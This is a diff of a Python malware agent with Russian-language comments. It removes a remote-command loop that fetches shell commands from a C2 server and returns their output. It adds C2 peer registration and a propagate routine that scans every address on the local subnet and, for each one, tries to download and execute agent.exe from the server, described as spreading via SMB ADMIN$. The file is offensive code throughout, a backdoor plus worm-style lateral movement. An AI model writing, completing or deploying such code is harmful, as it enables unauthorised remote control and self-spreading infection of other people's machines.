@@ -1,55 +1,48 @@
+import socket
+import os
 import requests
-import time
-import sys
 import subprocess
+import threading
+from shared.config import SERVER_URL
 
-SERVER_URL = "{{SERVER_URL}}"
-AGENT_NAME = "{{AGENT_NAME}}"
-
-def register_agent():
+def bootstrap_register(agent_id, port):
     try:
-        resp = requests.post(f"{SERVER_URL}/agents/", params={"name": AGENT_NAME})
-        resp.raise_for_status()
-        data = resp.json()
-        return data["id"]
+        ip = get_local_ip()
+        r = requests.post(
+            f"{SERVER_URL}/api/peers/register",
+            params={"id": agent_id, "ip": ip, "port": port},
+            timeout=5
+        )
+        if r.status_code == 200:
+            print(f"[{agent_id}] Registered on C2.")
     except Exception as e:
-        print(f"[!] Ошибка регистрации агента: {e}")
-        sys.exit(1)
+        print(f"[{agent_id}] Registration failed: {e}")
 
-def fetch_tasks(agent_id):
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        resp = requests.get(f"{SERVER_URL}/tasks/{agent_id}")
-        resp.raise_for_status()
-        return resp.json()
-    except Exception as e:
-        print(f"[!] Ошибка получения задач: {e}")
-        return []
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    finally:
+        s.close()
+    return ip
 
-def send_result(task_id, output):
+def propagate():
+    ip_base = get_local_ip().rsplit('.', 1)[0]
+    for i in range(2, 255):
+        target_ip = f"{ip_base}.{i}"
+        threading.Thread(target=try_infect, args=(target_ip,)).start()
+
+def try_infect(ip):
     try:
-        resp = requests.post(f"{SERVER_URL}/results/", params={"task_id": task_id, "output": output})
-        resp.raise_for_status()
-    except Exception as e:
-        print(f"[!] Ошибка отправки результата: {e}")
+        # Попытка скопировать и запустить агент через ADMIN$ (SMB)
+        agent_url = f"{SERVER_URL}/download/agent.exe"
+        local_copy = "C:\\Windows\\Temp\\agent.exe"
 
-def execute_command(command):
-    try:
-        completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
-        return completed.stdout + completed.stderr
-    except Exception as e:
-        return f"Ошибка выполнения команды: {e}"
-
-def main():
-    agent_id = register_agent()
-    print(f"[+] Агент зарегистрирован с ID: {agent_id}")
-
-    while True:
-        tasks = fetch_tasks(agent_id)
-        for task in tasks:
-            print(f"[+] Выполнение задачи {task['id']}: {task['command']}")
-            output = execute_command(task['command'])
-            send_result(task['id'], output)
-        time.sleep(10)
-
-if __name__ == "__main__":
-    main()
+        r = requests.get(agent_url, timeout=5)
+        if r.status_code == 200:
+            with open(local_copy, "wb") as f:
+                f.write(r.content)
+            subprocess.Popen(local_copy, shell=True)
+    except:
+        pass
